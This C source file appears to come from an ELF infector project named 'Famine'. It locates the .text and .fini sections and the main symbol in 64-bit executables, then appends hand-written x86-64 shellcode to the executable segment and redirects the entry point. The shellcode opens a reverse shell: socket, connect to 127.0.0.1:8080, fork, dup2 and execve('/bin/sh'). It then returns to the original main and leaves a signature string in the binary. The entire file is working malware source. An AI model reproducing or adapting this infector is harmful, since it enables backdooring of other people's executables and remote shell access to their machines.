#include "famine.h"

Elf64_Addr find_text_size_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".text"))
            return section->sh_size;
    }
    return 0;
}

Elf64_Addr find_text_addr_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".text"))
            return section->sh_addr;
    }
    return 0;
}

Elf64_Off find_fini_offset_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_offset;
    }
    return 0;
}

Elf64_Addr find_fini_size_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_size;
    }
    return 0;
}

Elf64_Addr find_main_addr_64(unsigned char *file) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Shdr *shdr = (Elf64_Shdr *)(file + ehdr->e_shoff);
    const char *sh_strtab = (char *)(file + shdr[ehdr->e_shstrndx].sh_offset);

    Elf64_Shdr *symtab = NULL;
    Elf64_Shdr *strtab = NULL;

    // Recherche symtab et strtab
    for (int i = 0; i < ehdr->e_shnum; i++) {
        const char *section_name = sh_strtab + shdr[i].sh_name;
        if (!strcmp(section_name, ".symtab"))
            symtab = &shdr[i];
        else if (!strcmp(section_name, ".strtab"))
            strtab = &shdr[i];
    }

    // exec non strip
    if (symtab && strtab) {
        Elf64_Sym *symbols = (Elf64_Sym *)(file + symtab->sh_offset);
        const char *strtab_data = (char *)(file + strtab->sh_offset);
        int num_symbols = symtab->sh_size / sizeof(Elf64_Sym);

        for (int i = 0; i < num_symbols; i++) {
            const char *name = strtab_data + symbols[i].st_name;
            if (!strcmp(name, "main"))
                return symbols[i].st_value;
        }
    }
    
    return 0;
}

Elf64_Addr find_main_size_64(unsigned char *file) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Shdr *shdr = (Elf64_Shdr *)(file + ehdr->e_shoff);
    const char *sh_strtab = (char *)(file + shdr[ehdr->e_shstrndx].sh_offset);

    Elf64_Shdr *symtab = NULL;
    Elf64_Shdr *strtab = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        const char *section_name = sh_strtab + shdr[i].sh_name;
        if (!strcmp(section_name, ".symtab"))
            symtab = &shdr[i];
        else if (!strcmp(section_name, ".strtab"))
            strtab = &shdr[i];
    }

    if (!symtab || !strtab) {
        return 0;
    }

    Elf64_Sym *symbols = (Elf64_Sym *)(file + symtab->sh_offset);
    const char *strtab_data = (char *)(file + strtab->sh_offset);
    int num_symbols = symtab->sh_size / sizeof(Elf64_Sym);

    for (int i = 0; i < num_symbols; i++) {
        const char *name = strtab_data + symbols[i].st_name;
        if (!strcmp(name, "main"))
            return symbols[i].st_size;
    }

    return 0;
}

int add_payload_64(unsigned char *file, size_t size_file, int fd) {
    unsigned char payload_door[] = {
        0x55,               // push rbp
        0x48, 0x89, 0xe5,   // mov rbp,rsp
        // 4 - 4

        // socket(AF_INET, SOCK_STREAM, 0)
        0x48, 0x31, 0xc0,                           // xor rax, rax
        0x48, 0xc7, 0xc7, 0x02, 0x00, 0x00, 0x00,   // mov rdi, 2        ; AF_INET
        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,   // mov rsi, 1        ; SOCK_STREAM
        0xba, 0x00, 0x00, 0x00, 0x00,               // mov edx, 0        ; protocol
        0xb8, 0x29, 0x00, 0x00, 0x00,               // mov eax, 41       ; syscall number
        0x0f, 0x05,                                 // syscall
        // 29 - 33

        0x49, 0x89, 0xC0,                           // mov r8, rax
        // 3 - 36

        // mprotect
        0x4c, 0x8d, 0x15, 0x0a, 0x01, 0x00, 0x00,               // lea r10, [rip + 266]
        0x4c, 0x89, 0xd7,                                       // mov rdi, r10
        0x48, 0x81, 0xe7, 0x00, 0xf0, 0xff, 0xff,               // and rdi, 0xfffffffffffff000
        0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00,               // mov rsi, 0x1000
        0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00,               // mov rdx, 7
        0xb8, 0x0a, 0x00, 0x00, 0x00,                           // mov eax, 10
        0x0f, 0x05,                                             // syscall
        // 38 - 74

        // create value struct sockaddr
        0x48, 0x31, 0xd2,                                   // xor rdx, rdx
        0x66, 0x41, 0xC7, 0x02, 0x02, 0x00,                 // mov word [r10], 0x2
        0x66, 0x41, 0xC7, 0x42, 0x02, 0x1F, 0x90,           // mov word [r10+2], 0x1F90 -> 8080
        0x41, 0xC7, 0x42, 0x04, 0x7f, 0x00, 0x00, 0x01,     // mov dword [r10+4], 0x7f000001 => addr ip 127.0.0.1 
        0x48, 0x31, 0xC0,                                   // xor rax, rax
        0x49, 0x31, 0x42, 0x08,                             // xor [r10+8], rax
        // 31 - 105

        // connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
        0x48, 0xc7, 0xc0, 0x2a, 0x00, 0x00, 0x00,       // mov rax, 42
        0x4c, 0x89, 0xc7,                               // mov rdi, r8
        0x4c, 0x89, 0xd6,                               // mov rsi, r10
        0xba, 0x10, 0x00, 0x00, 0x00,                   // mov edx, 16
        0x0f, 0x05,                                     // syscall
        // 20 - 125

        // fork()
        0x48, 0xc7, 0xc0, 0x39, 0x00, 0x00, 0x00,       // mov rax,57
        0x0f, 0x05,                                     // syscall
        // 9 - 134

        // si enfant -> rax = 0
        0x48, 0x85, 0xc0,                               // test rax, rax
        0x0f, 0x85, 0x72, 0x00, 0x00, 0x00,             // jne on saute de 114
        // 9 - 143

        // dup2
        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
        0x49, 0x89, 0xc7,                               // mov rdi, r8
        0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,       // mov rsi, 0 -> stdin
        0x0f, 0x05,                                     // syscall
        // 19 - 162

        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,       // mov rsi, 1 -> stdout
        0x0f, 0x05,                                     // syscall
        // 16 - 178

        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
        0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,       // mov rsi, 2 -> stderr
        0x0f, 0x05,                                     // syscall
        // 16 - 194

        // execve("/bin/sh", [bin/sh, NULL], NULL)
        0x48,0x31,0xc0,                                     // xor rax, rax
        0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,  // mov rbx, "/bin/sh"
        0x50,                                               // push rax (NULL terminator for string)
        0x53,                                               // push rbx
        0x48,0x89,0xe7,                                     // mov rdi, rsp (/bin/sh)
        0x48,0x31,0xc0,                                     // xor rax, rax
        0x50,                                               // push rax (argv[1] = NULL)
        0x57,                                               // push rdi (argv[0] = "/bin/sh")
        0x48,0x89,0xe6,                                     // mov rsi, rsp (argv pointer)
        0x48,0x31,0xc0,                                     // xor rax, rax
        0x50,                                               // push rax (envp[0] = NULL)
        0x48,0x89,0xe2,                                     // mov rdx, rsp (envp pointer)
        0xb0,0x3b,                                          // mov al, 59 (syscall execve)
        0x0f,0x05,                                          // syscall
        // 37 - 190 

        // exit(1)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,       // mov rdi, 1
        0xb8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 60
        0x0f, 0x05,                                     // syscall
        // 14 - 245

        0x48, 0x8b, 0x3c, 0x24,                                     // mov    rdi, [rsp]      ; argc
        0x48, 0x8d, 0x74, 0x24, 0x08,                               // lea    rsi, [rsp+8]    ; argv
        0x48, 0x89, 0xf1,                                           // mov    rcx, rsi        ; rcx = argv
        0x48, 0x8b, 0x01,                                           // mov    rax, [rcx]      ; rax = argv[i]
        0x48, 0x83, 0xc1, 0x08,                                     // add    rcx, 8          ; pointer vers argv[i+1]
        0x48, 0x85, 0xc0,                                           // test   rax, rax
        0x75, 0xf4,                                                 // jnz    -0x0C
        0x48, 0x89, 0xca,                                           // mov    rdx, rcx        ; rdx = envp
        0x48, 0x8d, 0x05, 0x00, 0x00, 0x00, 0x00,                   // lea rax, [rip]
        0x48, 0x2d, 0x00, 0x00, 0x00, 0x00,                         // sub rax, <dist to main>
        0x48, 0x89, 0xe5,                                           // mov rsp, rbp
        0x5d,                                                       // pop rbp
        0x48, 0x8d, 0x1d, 0x03, 0x00, 0x00, 0x00,                   // lea rbx, [rip + 0x3]
        0x53,                                                       // push rbx
        0xff, 0xd0,                                                 // call rax
        // 54 - 299

        // --- exit(0) ---
        0x48, 0x31, 0xff,                           // xor rdi, rdi
        0xb8, 0x3c, 0x00, 0x00, 0x00,               // mov eax, 60
        0x0f, 0x05,                                 // syscall
        // 10 -- 309

        // stock struct
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    Elf64_Addr main_addr = find_main_addr_64(file);
    Elf64_Addr fini_size = find_fini_size_64(file);
    Elf64_Addr main_size = find_main_size_64(file);
    if (main_addr == 0 || fini_size == 0 || main_size == 0)
        return -1;
    size_t payload_size = sizeof(payload_door);
    uint64_t t_payload = payload_size - 44;
    Elf64_Addr dist_to_main = fini_size + main_size + t_payload - 2;
    memcpy(&payload_door[t_payload], &dist_to_main, 4);

    ftruncate(fd, size_file + payload_size);

    munmap(file, size_file);
    file = mmap(NULL, size_file + payload_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(file + ehdr->e_phoff);

    Elf64_Phdr *exec_segment = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if ((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags & PF_X)) {
            exec_segment = &phdr[i];
            break;
        }
    }
    if (!exec_segment)
        return -1;

    Elf64_Off injection_offset = exec_segment->p_offset + exec_segment->p_filesz;
    Elf64_Addr injection_vaddr = exec_segment->p_vaddr + exec_segment->p_filesz;

    exec_segment->p_filesz += payload_size;
    exec_segment->p_memsz += payload_size;

    pwrite(fd, payload_door, payload_size, injection_offset);
    // memcpy(file + injection_offset, payload_door, payload_size);

    size_t phdrs_size = ehdr->e_phnum * sizeof(Elf64_Phdr);
    pwrite(fd, phdr, phdrs_size, ehdr->e_phoff);

    ehdr->e_entry = injection_vaddr;
    pwrite(fd, ehdr, sizeof(Elf64_Ehdr), 0);

    return payload_size;
}

int handle_64(unsigned char *file, size_t size_file, int fd) {
    unsigned char payload[] = "Famine version 0.7 (c)oded jul-0064 by bob\n";
    size_t size_payload = strlen((const char *)payload);

    int size_payload_door = add_payload_64(file, size_file, fd);
    // printf("Size payload: %lx\n", size_payload_door);
    size_t injection_offset;
    if (size_payload_door == -1)
        injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);
    else
        injection_offset = find_fini_offset_64(file) + find_fini_size_64(file) + size_payload_door;
    memcpy(file + injection_offset, payload, size_payload);

    return 0;
}
    